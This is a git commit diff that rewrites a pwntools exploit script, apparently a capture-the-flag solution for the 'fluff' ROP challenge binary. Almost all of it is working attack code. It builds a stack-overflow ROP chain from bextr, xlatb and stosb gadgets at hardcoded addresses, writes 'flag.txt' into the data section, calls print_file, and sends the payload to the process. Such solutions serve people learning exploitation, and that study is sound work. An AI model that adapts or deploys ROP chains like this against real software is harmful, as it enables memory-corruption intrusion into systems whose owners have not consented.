f008f106043d8963a25f8c65054ada97fcc7c4ee
rjt-gupta <rajat.gupta2017@vitstudent.ac.in>
2020-09-10 12:08:26 -0700

    fluff added

--- fluff64/fluff64.py
+++ fluff64/fluff64.py
@@ -1,17 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# This exploit template was generated via:
-# $ pwn template fluff
 from pwn import *
 
-# Set up pwntools for the correct architecture
-exe = context.binary = ELF('fluff')
-
-# Many built-in settings can be controlled on the command-line and show up
-# in "args".  For example, to dump all data sent/received, and disable ASLR
-# for all created processes...
-# ./exploit.py DEBUG NOASLR
-
+exe = context.binary = ELF('./fluff')
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -20,77 +11,55 @@ def start(argv=[], *a, **kw):
     else:
         return process([exe.path] + argv, *a, **kw)
 
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
 gdbscript = '''
 tbreak main
 continue
 '''.format(**locals())
 
-#===========================================================
-#                    EXPLOIT GOES HERE
-#===========================================================
-# Arch:     amd64-64-little
-# RELRO:    Partial RELRO
-# Stack:    No canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x400000)
-# RUNPATH:  '.'
 
-"""
-0x0000000000400639: stos BYTE PTR es:[rdi],al
-0x000000000040063a:	ret    
-0x00000000004006a3: pop rdi; ret; 
-0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret; 
-0x00000000004004d2: in al, dx; or byte ptr [rax - 0x75], cl; add eax, 0x200b1d; test rax, rax; je 0x4e2; call rax; 
-0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
-"""
+GADGET_bextr = 0x40062A
+GADGET_xlatb = 0x400628
+GADGET_stosb = 0x400639
+GADGET_pop_rdi = 0x4006a3
 
-io = start()
+DATA_SECTION_BUFF = 0x601800
 
-print_file = p64(0x0000000000400510)
-stos = p64(0x0000000000400639)
-ret = p64(0x000000000040063a)
-pop_rdi = p64(0x00000000004006a3)
-pop_rdx = p64(0x000000000040062a)
-
-dss = 0x0000000000601028 + 0x20
-#dss = 0x0000000000601038 + 0x20  #bss
-
-def mov_flag(string, section):
-
-	s = ""
-	s += pop_rdi
-	s += p64(section)
-	s += pop_rdx
-	s += string 
-	s += "junkjunk" # dummy for rcx
-	s += stos
-
-	return s
-
-buf = ""
-buf += "\x90"*40
-buf += mov_flag("f"*8, dss)
-buf += mov_flag("l"*8, dss+1)
-buf += mov_flag("a"*8, dss+2)
-buf += mov_flag("g"*8, dss+3)
-buf += mov_flag("."*8, dss+4)
-buf += mov_flag("t"*8, dss+5)
-buf += mov_flag("x"*8, dss+6)
-buf += mov_flag("t"*8, dss+7)
-
-# calling print_file
-
-buf += pop_rdi
-buf += p64(dss)
-buf += ret
-buf += print_file
+CHAR_POS = {}
+for c in b'flag.txt':
+	CHAR_POS[c] = next(exe.search(bytes([c])))
 
 
-write("in.txt", buf)
+def set_rbx(val):
+    num_bits = 64
+    start_bits = 0
+    src2 = num_bits << 8 | start_bits
+    src1 = val - 0x3EF2
+    return [GADGET_bextr, src2, src1]
 
-io.sendline(buf)
-io.interactive()
+CURRENT_AL = 11
+def set_al(charval):
+    global CURRENT_AL
+    target_addr = CHAR_POS[charval] - CURRENT_AL
+    CURRENT_AL = charval
+    return set_rbx(target_addr) + [GADGET_xlatb]
 
+def store_memory(addr, bs):
+    buf = []
+    buf += [GADGET_pop_rdi, addr]
+    for c in bs:
+        buf += set_al(c)
+        buf += [GADGET_stosb]
+    return buf
+
+r = start()
+
+buf = b'X' * 32 + b'SAVEDRBP'
+buf += flat(
+    store_memory(DATA_SECTION_BUFF, b'flag.txt') + 
+    [GADGET_pop_rdi, DATA_SECTION_BUFF, 0x400620, b'DONEDONE', b'ABCDEFGH'] # call print_file(DATA_SECTION_BUFF))
+    )
+assert len(buf) <= 0x200
+
+#gdb.attach(r)
+r.sendlineafter('solutions...\n> ', buf)
+r.interactive()
